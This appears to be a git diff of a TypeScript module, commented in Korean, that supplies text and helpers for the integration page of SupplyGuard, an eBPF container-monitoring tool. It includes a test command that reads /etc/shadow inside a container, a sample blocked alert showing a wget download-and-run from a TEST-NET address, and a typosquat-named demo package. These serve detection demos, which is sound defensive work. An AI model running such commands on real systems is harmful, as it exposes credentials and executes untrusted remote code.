@@ -1,13 +1,13 @@
 import type { FlowNode } from '../../components/FlowHero';
 import type { Info, InstallSession, IntegrationContainer, IntegrationEnv, IntegrationStatus, Kind, Verdict } from '../../lib/types';
 
-// 연동 페이지(11/06)의 흐름 그림 · 환경 점검 · 라벨 예시 — 화면과 e2e 가 같이 쓴다. 문구 규칙: 개조식 명사형 종결
+// 연동 페이지(11/06 · 11/09 밤 3페이지로)의 흐름 그림 · 환경 점검 · 라벨 예시 — 화면과 e2e 가 같이 쓴다. 문구 규칙: 개조식 명사형 종결
 
 export const FLOW: FlowNode[] = [
   { id: 'label', title: '내 컨테이너', sub: '라벨 한 줄', point: '컨테이너에 supplyguard.watch=true 라벨 추가됨' },
   { id: 'kernel', title: '커널 eBPF', sub: '실행 · 파일 · 통신 · 조회', point: '커널에서 실행 · 파일 열기 · 네트워크 연결 · DNS 질의 수집됨' },
-  { id: 'judge', title: 'SupplyGuard', sub: '정책으로 판정', point: '정책(YAML)과 비교해 정상 · 경고 · 격리 판정됨' },
-  { id: 'act', title: '경고 · 격리', sub: 'supplyguard.enforce', tone: 'danger', point: '위반은 기록 · 알림, 격리 라벨이 있으면 증거 수집 뒤 즉시 격리됨' },
+  { id: 'judge', title: 'SupplyGuard', sub: '정책으로 탐지', point: '정책(YAML)과 비교해 위반 탐지, 경고 · 격리로 나뉨' },
+  { id: 'act', title: '경고 · 격리', sub: 'supplyguard.enforce', tone: 'danger', point: '경고는 기록 후 알림 발송, 격리 라벨이 있으면 증거 수집 뒤 즉시 격리됨' },
 ];
 
 export type Tone = 'ok' | 'warn' | 'off';
@@ -29,19 +29,19 @@ export function envChecks(env: IntegrationEnv, info: Info | null): Check[] {
     !env.kernel
       ? { id: 'kernel', label: '커널', value: '확인 불가(리눅스 아님)', tone: 'off', hint: '리눅스 서버(커널 5.15 이상)에서 실제 수집 가능' }
       : major >= 7
-        ? { id: 'kernel', label: '커널', value: env.kernel, tone: 'warn', hint: '커널 7.0 에서 이벤트 유실 확인됨 — Ubuntu 22.04(커널 5.15 · 6.8) 권장' }
+        ? { id: 'kernel', label: '커널', value: env.kernel, tone: 'warn', hint: '커널 7.0 에서 이벤트 유실 확인됨, Ubuntu 22.04(커널 5.15 · 6.8) 권장' }
         : major > 5 || (major === 5 && minor >= 15)
           ? { id: 'kernel', label: '커널', value: env.kernel, tone: 'ok' }
           : { id: 'kernel', label: '커널', value: env.kernel, tone: 'warn', hint: '커널 5.15 이상 권장' },
   );
-  out.push({ id: 'os', label: '운영체제', value: env.os || '—', tone: env.os ? 'ok' : 'off' });
+  out.push({ id: 'os', label: '운영체제', value: env.os || '', tone: env.os ? 'ok' : 'off' });
   const g = info?.gadgets ?? [];
   const need: Kind[] = ['exec', 'open', 'connect'];
   const missing = need.filter((x) => !g.includes(x));
   out.push(
     missing.length
       ? { id: 'gadgets', label: '수집 항목', value: `${missing.join(' · ')} 없음`, tone: 'warn', hint: 'GADGETS 설정 확인 필요' }
-      : { id: 'gadgets', label: '수집 항목', value: info?.dnsResolve === 'ok' ? '실행 · 파일 · 통신 · DNS' : '실행 · 파일 · 통신', tone: info?.dnsResolve === 'off' ? 'warn' : 'ok', hint: info?.dnsResolve === 'off' ? 'trace_dns 꺼짐 — 도메인 기준 판정 통과 처리됨' : undefined },
+      : { id: 'gadgets', label: '수집 항목', value: info?.dnsResolve === 'ok' ? '실행 · 파일 · 통신 · DNS' : '실행 · 파일 · 통신', tone: info?.dnsResolve === 'off' ? 'warn' : 'ok', hint: info?.dnsResolve === 'off' ? 'trace_dns 꺼짐, 도메인 기준 탐지는 통과 처리됨' : undefined },
   );
   const d = info?.discovery ?? '';
   out.push(
@@ -54,7 +54,7 @@ export function envChecks(env: IntegrationEnv, info: Info | null): Check[] {
   out.push(
     env.enforceKill
       ? { id: 'enforce', label: '격리', value: '켜짐', tone: 'ok' }
-      : { id: 'enforce', label: '격리', value: '꺼짐(dry-run)', tone: 'warn', hint: 'ENFORCE_KILL=false — 격리 정책도 알림만 전송됨' },
+      : { id: 'enforce', label: '격리', value: '꺼짐(dry-run)', tone: 'warn', hint: 'ENFORCE_KILL=false(격리 정책도 격리하지 않고 경고만 남김)' },
   );
   return out;
 }
@@ -69,12 +69,34 @@ export function needsIntegration(st: IntegrationStatus | undefined): boolean {
 
 
 // ── 시나리오(11/06 요구 1 수정 — 사용자가 값을 넣으면 설정 생성 → 적용 뒤 자동 감지 → 내 컨테이너에서 시험 동작) ──
+// 카드(11/09 밤 사용자 결정) = 제목 + 한 줄 설명 + 예 하나. 세부(대상 · 라벨 · 자동 감지 · 감지 진행)는 고른 뒤 1단계 안 NOTES 로만
 export type ScenarioId = 'single' | 'multi' | 'install';
-export const SCENARIOS: { id: ScenarioId; title: string; sub: string; points: string[] }[] = [
-  { id: 'single', title: '내 서비스 하나', sub: 'compose 서비스 1개 또는 docker run', points: ['라벨 2줄로 감시 · 격리 설정됨', '다시 만들면 화면이 자동 감지함'] },
-  { id: 'multi', title: '여러 컨테이너 한 번에', sub: 'compose 프로젝트 전체', points: ['서비스별 감시 · 격리 선택됨', '감지 진행 n / m 표시됨'] },
-  { id: 'install', title: '패키지 설치 검사', sub: 'pip · npm · cargo 설치를 격리 환경에서', points: ['설치 중 악성 동작 시 즉시 격리됨', '같은 패키지 정적 검사 함께 시작됨'] },
+export const SCENARIOS: { id: ScenarioId; title: string; desc: string; example: string }[] = [
+  { id: 'single', title: '내 서비스 하나', desc: '컨테이너 하나를 감시합니다.', example: 'docker run my-app' },
+  { id: 'multi', title: '여러 컨테이너 한 번에', desc: 'compose 프로젝트를 한 번에 감시합니다.', example: 'web · api · db' },
+  { id: 'install', title: '패키지 설치 검사', desc: '설치 전에 격리 환경에서 검사합니다.', example: 'pip install requests' },
 ];
+// 1단계 위 3컷 흐름 그림(11/10 사용자 결정 「흐름 그림 + 2단 미리보기」) — 무엇을 → 어떻게 → 결과.
+//   11/06 카드의 부제 · 요점(옛 SCENARIO_NOTES)을 컷 설명으로 옮겼다(개조식 명사형 종결). 아이콘 이름은 ScenarioWizard 가 그림으로 바꾼다
+export type CutIcon = 'container' | 'tag' | 'shield' | 'layers' | 'tags' | 'terminal' | 'box' | 'split';
+export interface Cut { icon: CutIcon; title: string; desc: string }
+export const SCENARIO_FLOW: Record<ScenarioId, Cut[]> = {
+  single: [
+    { icon: 'container', title: '내 컨테이너', desc: 'compose 서비스 1개 또는 docker run 컨테이너 1개 대상' },
+    { icon: 'tag', title: '라벨 2줄 추가 후 다시 실행', desc: '감시 라벨 + 격리 라벨(선택), 다시 만들면 화면이 자동 감지함' },
+    { icon: 'shield', title: 'SupplyGuard 가 감시', desc: '위반이면 경고, 격리 라벨이 있으면 증거 수집 뒤 격리' },
+  ],
+  multi: [
+    { icon: 'layers', title: 'compose 프로젝트', desc: 'compose 프로젝트 전체 대상, 서비스 목록만 입력' },
+    { icon: 'tags', title: '서비스마다 라벨', desc: '서비스별 감시 · 격리 선택됨, 감시를 끈 서비스는 라벨 없음' },
+    { icon: 'shield', title: '한 번에 감시', desc: '다시 실행 한 번, 적용 뒤 감지 진행(감지 수 / 전체) 표시됨' },
+  ],
+  install: [
+    { icon: 'terminal', title: '터미널에서 sg-install', desc: 'pip · npm · cargo 대신 실행, 같은 패키지 정적 검사 함께 시작됨' },
+    { icon: 'box', title: '격리 컨테이너 안에서 설치', desc: '감시 컨테이너(sg-install-*) 안에서 설치, 호스트에 설치되지 않음' },
+    { icon: 'split', title: '통과 또는 설치 전 격리', desc: '악성 동작이면 설치 완료 전에 격리됨, 결과는 설치 검사 화면에 기록됨' },
+  ],
+};
 export const STEPS = ['입력', '적용', '확인'] as const;
 
 export interface SingleInput { mode: 'compose' | 'run'; name: string; image: string; enforce: boolean }
@@ -92,14 +114,23 @@ export const DEFAULT_MULTI: MultiInput = {
   ],
 };
 export const DEFAULT_INSTALL: InstallInput = { manager: 'pip', pkg: 'requests' };
+// 「예시로 채우기」(11/10) — 격리까지 켠 예라 미리보기에 라벨 2줄이 보인다
+export const EXAMPLE_SINGLE: Omit<SingleInput, 'mode'> = { name: 'shop-api', image: 'shop-api:1.4', enforce: true };
+export const EXAMPLE_MULTI: MultiInput = DEFAULT_MULTI;
+export const EXAMPLE_INSTALL: InstallInput = { manager: 'pip', pkg: 'requests==2.31.0' };
+// 「악성 흉내 패키지로 시연」 — 저장소의 무해한 시뮬 패키지(TEST-NET 주소 · 예약 도메인만)
+export const DEMO_INSTALL: InstallInput = { manager: 'pip', pkg: './deploy/demo/reqeusts' };
 
 // 입력 검사 — Docker 컨테이너 · 서비스 이름 규칙, 이미지 참조, 패키지(이름 + 버전 지정)
 const NAME_RE = /^[a-z0-9][a-z0-9_.-]{0,62}$/;
 const IMAGE_RE = /^[a-z0-9][a-z0-9._/:@-]{0,254}$/i;
 const PKG_RE = /^[A-Za-z0-9@][A-Za-z0-9._@/=<>~^!-]{0,213}$/;
-export const nameError = (s: string) => (!s ? '이름 필요' : NAME_RE.test(s) ? '' : '소문자 · 숫자 · - _ . 만 가능');
-export const imageError = (s: string) => (!s ? '이미지 필요' : IMAGE_RE.test(s) ? '' : '이미지 형식 확인 필요(예: my-app:1.0)');
-export const pkgError = (s: string) => (!s ? '패키지 필요' : PKG_RE.test(s) ? '' : '패키지 이름 형식 확인 필요');
+// 저장소 안 폴더(sg-install 이 읽기 전용으로 붙임) — ./ 또는 ../ 로 시작
+const LOCAL_RE = /^\.\.?\/[A-Za-z0-9._/-]{1,200}$/;
+// 입력 검사 문구(11/09 SPEC §7): 빈 값 「[칸]을(를) 입력하세요.」 · 모양 「[칸]은 [예] 모양으로 입력하세요.」
+export const nameError = (s: string) => (!s ? '이름을 입력하세요.' : NAME_RE.test(s) ? '' : '이름은 소문자 · 숫자 · - _ . 만 쓸 수 있습니다.');
+export const imageError = (s: string) => (!s ? '이미지를 입력하세요.' : IMAGE_RE.test(s) ? '' : '이미지는 my-app:1.0 모양으로 입력하세요.');
+export const pkgError = (s: string) => (!s ? '패키지 이름을 입력하세요.' : PKG_RE.test(s) || LOCAL_RE.test(s) ? '' : '패키지 이름은 requests 모양으로 입력하세요.');
 export function singleErrors(i: SingleInput) {
   return { name: nameError(i.name), image: imageError(i.image) };
 }
@@ -107,8 +138,8 @@ export function multiErrors(i: MultiInput) {
   const names = i.services.map((s) => s.name);
   return {
     project: nameError(i.project),
-    services: i.services.map((s, k) => ({ name: nameError(s.name) || (names.indexOf(s.name) !== k ? '이름 중복' : ''), image: imageError(s.image) })),
-    none: i.services.some((s) => s.watch) ? '' : '감시할 서비스 1개 이상 필요',
+    services: i.services.map((s, k) => ({ name: nameError(s.name) || (names.indexOf(s.name) !== k ? '이름이 겹칩니다.' : ''), image: imageError(s.image) })),
+    none: i.services.some((s) => s.watch) ? '' : '감시할 서비스 1개 이상을 고르세요.',
   };
 }
 const ok = (o: Record<string, string>) => Object.values(o).every((v) => !v);
@@ -139,6 +170,26 @@ export function multiSnippet(i: MultiInput, env: Labels): string {
 export const multiApply = () => 'docker compose up -d';
 export const installCmd = (i: InstallInput) => `tools/sg-install ${i.manager} ${i.pkg}`;
 export const testCmd = (container: string) => `docker exec ${container} cat /etc/shadow`;
+// 미리보기에서 강조 · 셈하는 줄 = SupplyGuard 라벨 줄(11/10)
+export const isAdded = (line: string) => line.includes('supplyguard.');
+export const addedCount = (snippet: string) => snippet.split('\n').filter(isAdded).length;
+
+// 설치 검사 터미널 순서(11/10) — 토큰은 파일에서 읽는 명령만(값은 화면에 두지 않는다)
+export const TOKEN_CMD = `export SUPPLYGUARD_SANDBOX_TOKEN="$(grep '^SANDBOX_TOKEN=' .env.local | cut -d= -f2-)"`;
+// 결과 예시 — tools/sg-install 이 찍는 줄을 줄여 옮김(화면 규칙에 맞춰 줄표는 쉼표로)
+export const resultPass = (i: InstallInput) => [`$ ${installCmd(i)}`, `▶ ${i.manager} install ${i.pkg}`, '  컨테이너 sg-install-…, SupplyGuard 감시 중', '[OK] 위반 없음'].join('\n');
+export const RESULT_KILL = [
+  '[격리됨] 위반 1건, 컨테이너를 SIGKILL 로 격리했습니다',
+  '  1. [exec] no-shell-download  wget -q -O- http://203.0.113.7/…',
+  '     외부 스크립트를 내려받아 셸로 실행  <- 격리',
+  '이 패키지를 설치하지 마세요.',
+].join('\n');
+export const EXIT_CODES: [string, string][] = [
+  ['0', '통과, 위반 없음'],
+  ['2', '위반, 격리 또는 경고(설치 검사 화면에 새 건)'],
+  ['3', '차단 목록, 컨테이너를 띄우기 전 거부'],
+  ['77', '토큰 거부, ① 토큰 준비 줄 확인'],
+];
 
 // 자동 감지 — 기대 이름이 감시 목록에 「감시 중」으로 나타나면 감지됨
 export interface Expect { name: string; enforce: boolean }
@@ -165,3 +216,6 @@ export function testVerdict<T extends Verdict>(verdicts: T[], container: string,
   const from = Date.parse(armedAt) - 5000;
   return verdicts.find((v) => v.matched && v.event.containerName === container && Date.parse(v.event.timestamp) >= from) ?? null;
 }
+
+// 감시 중 컨테이너 상세 시트 탭(11/10) — 첫 탭(정보)은 주소에 쓰지 않는다(?tab=violations · events)
+export const WATCH_TABS = ['info', 'violations', 'events'] as const;
